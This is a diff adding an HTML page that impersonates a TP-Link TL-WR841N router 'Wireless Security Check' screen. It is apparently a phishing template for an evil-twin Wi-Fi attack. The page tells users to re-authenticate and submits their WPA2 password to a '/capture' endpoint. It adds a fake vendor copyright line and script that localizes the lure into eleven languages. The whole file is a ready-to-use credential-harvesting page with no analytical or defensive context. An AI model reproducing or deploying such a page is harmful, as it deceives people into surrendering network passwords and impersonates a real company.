@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TP-Link - Wireless Router</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
+background:#f0f4f8;display:flex;flex-direction:column;min-height:100vh}
+.topbar{background:#00a0e9;padding:0 24px;height:50px;display:flex;align-items:center;
+box-shadow:0 2px 6px rgba(0,0,0,.15)}
+.topbar-logo{color:#fff;font-size:1.4em;font-weight:700;letter-spacing:-.5px}
+.topbar-model{color:rgba(255,255,255,.75);font-size:.85em;margin-left:12px}
+.content{flex:1;display:flex;justify-content:center;align-items:center;padding:24px}
+.card{background:#fff;border-radius:4px;width:100%;max-width:440px;
+box-shadow:0 1px 8px rgba(0,0,0,.12)}
+.card-header{background:#00a0e9;padding:16px 24px;border-radius:4px 4px 0 0}
+.card-header h1{color:#fff;font-size:1.05em;font-weight:600}
+.card-header p{color:rgba(255,255,255,.85);font-size:.8em;margin-top:4px}
+.card-body{padding:28px 24px}
+.field{margin-bottom:18px}
+label{display:block;font-size:.82em;color:#555;margin-bottom:5px;font-weight:500}
+input[type=password]{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:3px;
+font-size:.93em;outline:none;transition:border .2s}
+input[type=password]:focus{border-color:#00a0e9;box-shadow:0 0 0 2px rgba(0,160,233,.15)}
+.btn-row{margin-top:8px}
+button{background:#00a0e9;color:#fff;border:none;border-radius:3px;padding:10px 32px;
+font-size:.93em;font-weight:600;cursor:pointer;transition:background .2s}
+button:hover{background:#0082c0}
+.hint{font-size:.75em;color:#999;margin-top:14px;line-height:1.5}
+.footer{text-align:center;padding:12px;font-size:.72em;color:#aaa;background:#f7f9fc}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <span class="topbar-logo">TP-Link</span>
+  <span class="topbar-model" data-i18n="model">TL-WR841N Wireless N Router</span>
+</div>
+<div class="content">
+  <div class="card">
+    <div class="card-header">
+      <h1 data-i18n="title">Wireless Security Check</h1>
+      <p data-i18n="sub">Re-authenticate to continue using Wi-Fi</p>
+    </div>
+    <div class="card-body">
+      <form method="POST" action="/capture" autocomplete="off">
+        <input type="hidden" name="csrf_token" value="">
+        <div class="field">
+          <label for="password" data-i18n="lbl_pass">Wireless Password (WPA2)</label>
+          <input type="password" id="password" name="password"
+                 data-i18n-ph="ph_pass" placeholder="Enter wireless password"
+                 required minlength="8" maxlength="63">
+        </div>
+        <div class="btn-row">
+          <button type="submit" data-i18n="btn">Apply</button>
+        </div>
+      </form>
+      <p class="hint" data-i18n="hint">Your wireless key can be found on the label at the bottom of your router.</p>
+    </div>
+  </div>
+</div>
+<div class="footer" data-i18n="footer">Copyright &copy; 2024 TP-Link Technologies Co., Ltd. All rights reserved.</div>
+<script>
+(function(){
+var T={
+en:{title:"Wireless Security Check",sub:"Re-authenticate to continue using Wi-Fi",lbl_pass:"Wireless Password (WPA2)",btn:"Apply",hint:"Your wireless key can be found on the label at the bottom of your router.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd. All rights reserved.",model:"TL-WR841N Wireless N Router",ph_pass:"Enter wireless password"},
+pt:{title:"Verifica\u00e7\u00e3o de Seguran\u00e7a Sem Fio",sub:"Reautentique-se para continuar usando o Wi-Fi",lbl_pass:"Senha da Rede (WPA2)",btn:"Aplicar",hint:"Sua chave sem fio pode ser encontrada na etiqueta na parte inferior do roteador.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltda. Todos os direitos reservados.",model:"Roteador Wireless TP-Link",ph_pass:"Digite a senha sem fio"},
+es:{title:"Verificaci\u00f3n de Seguridad Inal\u00e1mbrica",sub:"Reaut\u00edntiquese para continuar usando Wi-Fi",lbl_pass:"Contrase\u00f1a Inal\u00e1mbrica (WPA2)",btn:"Aplicar",hint:"Su clave inal\u00e1mbrica se encuentra en la etiqueta en la parte inferior del router.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd. Todos los derechos reservados.",model:"Router Inal\u00e1mbrico TP-Link",ph_pass:"Ingrese la contrase\u00f1a"},
+fr:{title:"V\u00e9rification de s\u00e9curit\u00e9 sans fil",sub:"Authentifiez-vous \u00e0 nouveau pour continuer",lbl_pass:"Mot de passe sans fil (WPA2)",btn:"Appliquer",hint:"Votre cl\u00e9 sans fil se trouve sur l\u0027\u00e9tiquette sous votre routeur.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd. Tous droits r\u00e9serv\u00e9s.",model:"Routeur TP-Link",ph_pass:"Entrez le mot de passe"},
+de:{title:"WLAN-Sicherheitspr\u00fcfung",sub:"Authentifizieren Sie sich erneut, um WLAN zu nutzen",lbl_pass:"WLAN-Passwort (WPA2)",btn:"Anwenden",hint:"Ihr WLAN-Schl\u00fcssel befindet sich auf dem Aufkleber an der Unterseite des Routers.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd. Alle Rechte vorbehalten.",model:"TP-Link WLAN-Router",ph_pass:"Passwort eingeben"},
+it:{title:"Controllo sicurezza wireless",sub:"Riautenticarsi per continuare a usare il Wi-Fi",lbl_pass:"Password wireless (WPA2)",btn:"Applica",hint:"La chiave wireless si trova sull\u0027etichetta sul fondo del router.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd. Tutti i diritti riservati.",model:"Router Wireless TP-Link",ph_pass:"Inserisci la password"},
+ja:{title:"\u7121\u7dda\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u78ba\u8a8d",sub:"Wi-Fi\u306e\u4f7f\u7528\u3092\u7d9a\u3051\u308b\u306b\u306f\u518d\u8a8d\u8a3c\u304c\u5fc5\u8981\u3067\u3059",lbl_pass:"\u30ef\u30a4\u30e4\u30ec\u30b9\u30d1\u30b9\u30ef\u30fc\u30c9(WPA2)",btn:"\u9069\u7528",hint:"\u30ef\u30a4\u30e4\u30ec\u30b9\u30ad\u30fc\u306f\u30eb\u30fc\u30bf\u30fc\u5e95\u9762\u306e\u30e9\u30d9\u30eb\u306b\u8a18\u8f09\u3055\u308c\u3066\u3044\u307e\u3059\u3002",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd.",model:"TP-Link \u30ef\u30a4\u30e4\u30ec\u30b9\u30eb\u30fc\u30bf\u30fc",ph_pass:"\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u5165\u529b"},
+zh:{title:"\u65e0\u7ebf\u5b89\u5168\u68c0\u67e5",sub:"\u8bf7\u91cd\u65b0\u8eab\u4efd\u9a8c\u8bc1\u4ee5\u7ee7\u7e8c\u4f7f\u7528Wi-Fi",lbl_pass:"\u65e0\u7ebf\u5bc6\u7801(WPA2)",btn:"\u5e94\u7528",hint:"\u65e0\u7ebf\u5bc6\u94a5\u53ef\u5728\u8def\u7531\u5668\u5e95\u90e8\u6807\u7b7e\u4e0a\u627e\u5230\u3002",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd. \u7248\u6743\u6240\u6709",model:"TP-Link \u65e0\u7ebf\u8def\u7531\u5668",ph_pass:"\u8f93\u5165\u5bc6\u7801"},
+ko:{title:"\ubb34\uc120 \ubcf4\uc548 \ud655\uc778",sub:"Wi-Fi \uc0ac\uc6a9\uc744 \uacc4\uc18d\ud558\ub824\uba74 \uc7ac\uc778\uc99d\uc774 \ud544\uc694\ud569\ub2c8\ub2e4",lbl_pass:"\uc640\uc774\uc5b4\ub808\uc2a4 \ube44\ubc00\ubc88\ud638(WPA2)",btn:"\uc801\uc6a9",hint:"\uc640\uc774\uc5b4\ub808\uc2a4 \ud0a4\ub294 \ub77c\uc6b0\ud130 \ud558\ub2e8 \ub77c\ubca8\uc5d0\uc11c \ucc3e\uc744 \uc218 \uc788\uc2b5\ub2c8\ub2e4.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd.",model:"TP-Link \ubb34\uc120 \ub77c\uc6b0\ud130",ph_pass:"\ube44\ubc00\ubc88\ud638 \uc785\ub825"},
+ru:{title:"\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438 \u0431\u0435\u0441\u043f\u0440\u043e\u0432\u043e\u0434\u043d\u043e\u0439 \u0441\u0435\u0442\u0438",sub:"\u041f\u043e\u0432\u0442\u043e\u0440\u043d\u043e \u0430\u0443\u0442\u0435\u043d\u0442\u0438\u0444\u0438\u0446\u0438\u0440\u0443\u0439\u0442\u0435\u0441\u044c \u0434\u043b\u044f \u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0435\u043d\u0438\u044f",lbl_pass:"\u041f\u0430\u0440\u043e\u043b\u044c \u0431\u0435\u0441\u043f\u0440\u043e\u0432\u043e\u0434\u043d\u043e\u0439 \u0441\u0435\u0442\u0438(WPA2)",btn:"\u041f\u0440\u0438\u043c\u0435\u043d\u0438\u0442\u044c",hint:"\u0412\u0430\u0448 \u043a\u043b\u044e\u0447 \u0441\u0435\u0442\u0438 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u043d\u0430 \u044d\u0442\u0438\u043a\u0435\u0442\u043a\u0435 \u043d\u0430 \u043d\u0438\u0436\u043d\u0435\u0439 \u0447\u0430\u0441\u0442\u0438 \u0440\u043e\u0443\u0442\u0435\u0440\u0430.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd.",model:"TP-Link \u0411\u0435\u0441\u043f\u0440\u043e\u0432\u043e\u0434\u043d\u043e\u0439 \u0440\u043e\u0443\u0442\u0435\u0440",ph_pass:"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0430\u0440\u043e\u043b\u044c"},
+ar:{title:"\u0641\u062d\u0635 \u0623\u0645\u0627\u0646 \u0627\u0644\u0634\u0628\u0643\u0629 \u0627\u0644\u0644\u0627\u0633\u0644\u0643\u064a\u0629",sub:"\u0623\u0639\u062f \u0627\u0644\u0645\u0635\u0627\u062f\u0642\u0629 \u0644\u0644\u0627\u0633\u062a\u0645\u0631\u0627\u0631 \u0641\u064a \u0627\u0633\u062a\u062e\u062f\u0627\u0645 Wi-Fi",lbl_pass:"\u0643\u0644\u0645\u0629 \u0645\u0631\u0648\u0631 \u0627\u0644\u0634\u0628\u0643\u0629 (WPA2)",btn:"\u062a\u0637\u0628\u064a\u0642",hint:"\u064a\u0645\u0643\u0646 \u0627\u0644\u0639\u062b\u0648\u0631 \u0639\u0644\u0649 \u0645\u0641\u062a\u0627\u062d \u0627\u0644\u0634\u0628\u0643\u0629 \u0641\u064a \u0627\u0644\u0645\u0644\u0635\u0642 \u0639\u0644\u0649 \u0627\u0644\u062c\u0632\u0621 \u0627\u0644\u0633\u0641\u0644\u064a \u0645\u0646 \u062c\u0647\u0627\u0632 \u0627\u0644\u062a\u0648\u062c\u064a\u0647.",footer:"Copyright \u00a9 2024 TP-Link Technologies Co., Ltd.",model:"TP-Link \u0631\u0627\u0648\u062a\u0631 \u0644\u0627\u0633\u0644\u0643\u064a",ph_pass:"\u0623\u062f\u062e\u0644 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631"}
+};
+var l=(navigator.language||navigator.userLanguage||"en").split("-")[0];
+var t=T[l]||T["en"];
+var els=document.querySelectorAll("[data-i18n]");
+for(var i=0;i<els.length;i++){var k=els[i].getAttribute("data-i18n");if(t[k])els[i].textContent=t[k];}
+var phs=document.querySelectorAll("[data-i18n-ph]");
+for(var j=0;j<phs.length;j++){var p=phs[j].getAttribute("data-i18n-ph");if(t[p])phs[j].placeholder=t[p];}
+if(l==="ar")document.documentElement.dir="rtl";
+document.documentElement.lang=l;
+})();
+</script>
+</body>
+</html>
